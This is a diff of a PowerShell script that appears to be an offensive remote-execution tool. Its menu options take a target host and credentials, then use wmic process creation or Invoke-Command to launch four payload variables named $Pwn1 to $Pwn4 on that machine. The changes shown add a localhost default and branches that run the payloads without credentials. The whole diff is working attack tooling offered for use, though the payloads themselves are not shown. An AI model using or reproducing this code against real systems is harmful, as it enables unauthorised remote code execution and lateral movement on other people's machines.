@@ -245,7 +245,7 @@ if($Language -in 'Spanish') {
 
         '2' {
 	Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine()
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
         $user = $Host.UI.ReadLine()
         Write-Host ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray
@@ -262,34 +262,41 @@ if($Language -in 'Spanish') {
 
 	'3' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine()
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
         $user = $Host.UI.ReadLine()
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
-        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn1"
+	if(!$user) { wmic path win32_process call create "powershell.exe $Pwn1"
+        wmic path win32_process call create "powershell.exe $Pwn2"
+        wmic path win32_process call create "powershell.exe $Pwn3"
+        wmic path win32_process call create "powershell.exe $Pwn4" }
+        if($user) { wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn1"
         wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn2"
         wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn3"
-        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn4" }
+        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn4" }}
 
         '4' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine()
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
         $user = $Host.UI.ReadLine()
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
-        $PSSession = New-PSSession -Computer $computer -credential $credential
-        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn1 }
-        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn2 }
-        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn3 }
-        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn4 }}
+        if(!$user) { Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn1 }
+        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn2 }
+        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn3 }
+        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn4 }}
+	if($user) { Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe $using:Pwn1 }
+        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe $using:Pwn2 }
+        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe $using:Pwn3 }
+        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe $using:Pwn4 }}}
 
         '5' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine()
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
         $user = $Host.UI.ReadLine()
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
